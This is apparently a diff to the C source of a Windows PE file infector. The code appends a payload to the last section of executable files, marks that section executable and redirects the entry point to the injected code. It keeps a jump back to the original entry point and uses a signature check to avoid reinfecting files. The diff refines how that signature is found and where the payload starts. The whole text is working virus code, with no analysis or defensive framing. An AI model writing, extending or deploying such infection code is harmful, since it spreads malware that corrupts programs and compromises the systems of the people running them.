@@ -4,9 +4,10 @@
 #include "utils.h"
 
 EXTERN_C_START
+extern CONST BYTE __payload_start;
+extern CONST DWORD signature;
 extern CONST VOID payload();
 extern CONST LONGLONG delta_start;
-extern CONST DWORD signature;
 extern CONST DWORD code_size;
 EXTERN_C_END
 
@@ -82,7 +83,7 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
     PCIMAGE_DOS_HEADER pDosHeader;
     PIMAGE_NT_HEADERS64 pNtHeader;
     PIMAGE_SECTION_HEADER pSection, pLastSection;
-    DWORD dwOrigEntryPoint, dwOrigRawSize, dwSizeAligned;
+    DWORD dwLastSectionPtr, dwLastSectionSize, dwOrigEntryPoint, dwSizeAligned;
     PBYTE pPayloadData;
 
     do {
@@ -109,6 +110,7 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
         }
 
         dwFileSize = pGetFileSize(hFile, NULL);
+#pragma warning(suppress : 4146)
         dwNewFileSize = PG_ALIGN_UP(dwFileSize + PG_ALIGN_UP(code_size, 512), 512);
         // ^ TODO: Get file alignment from PE header instead of hardcoding 512
         //         Load file in read-only mode and reopen in RW later
@@ -140,33 +142,41 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
 
         pSection = IMAGE_FIRST_SECTION(pNtHeader);
         pLastSection = &pSection[pNtHeader->FileHeader.NumberOfSections - 1];
-        dwOrigRawSize = pLastSection->SizeOfRawData;
-        pPayloadData = (PBYTE)pDosHeader + pLastSection->PointerToRawData + dwOrigRawSize;
-        dwSignature = *(PCDWORD)(pPayloadData -
-                                 ((PCBYTE)&code_size - (PCBYTE)&signature + sizeof(code_size)));
-        if (dwSignature == signature) {
-            goto error;
-        }
-
+        dwLastSectionPtr = pLastSection->PointerToRawData;
+        dwLastSectionSize = pLastSection->SizeOfRawData;
+        pPayloadData = (PBYTE)pDosHeader + dwLastSectionPtr + dwLastSectionSize;
         dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
 
+        if (dwOrigEntryPoint >= pLastSection->VirtualAddress &&
+            dwOrigEntryPoint < pLastSection->VirtualAddress + dwLastSectionSize) {
+            dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwLastSectionPtr +
+                                     (dwOrigEntryPoint - pLastSection->VirtualAddress) -
+                                     ((PCBYTE)&payload - (PCBYTE)&signature));
+            if (dwSignature == signature) {
+                goto error;
+            }
+        }
+
+#pragma warning(suppress : 4146)
         dwSizeAligned = PG_ALIGN_UP(code_size, pNtHeader->OptionalHeader.FileAlignment);
         // ^ Compute aligned size earlier
-        pLastSection->Misc.VirtualSize = dwOrigRawSize + code_size;
+        pLastSection->Misc.VirtualSize = dwLastSectionSize + code_size;
         pLastSection->SizeOfRawData += dwSizeAligned;
         pNtHeader->OptionalHeader.SizeOfCode += pLastSection->Characteristics & IMAGE_SCN_CNT_CODE
                                                     ? dwSizeAligned
                                                     : pLastSection->SizeOfRawData;
         pNtHeader->OptionalHeader.SizeOfImage =
+#pragma warning(suppress : 4146)
             PG_ALIGN_UP(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize,
                         pNtHeader->OptionalHeader.SectionAlignment);
         pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
         pLastSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
         pNtHeader->OptionalHeader.AddressOfEntryPoint =
-            pLastSection->VirtualAddress + dwOrigRawSize;
+            pLastSection->VirtualAddress + dwLastSectionSize +
+            (LONG)((PCBYTE)&payload - (PCBYTE)&__payload_start);
 
-        my_memcpy(pPayloadData, (PCBYTE)payload, code_size);
-        *(PLONGLONG)(pPayloadData + ((PCBYTE)&delta_start - (PCBYTE)&payload)) =
+        my_memcpy(pPayloadData, (PCBYTE)&__payload_start, code_size);
+        *(PLONGLONG)(pPayloadData + ((PCBYTE)&delta_start - (PCBYTE)&__payload_start)) =
             (LONGLONG)dwOrigEntryPoint - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;
 
         pFlushViewOfFile(pMapAddress, 0);
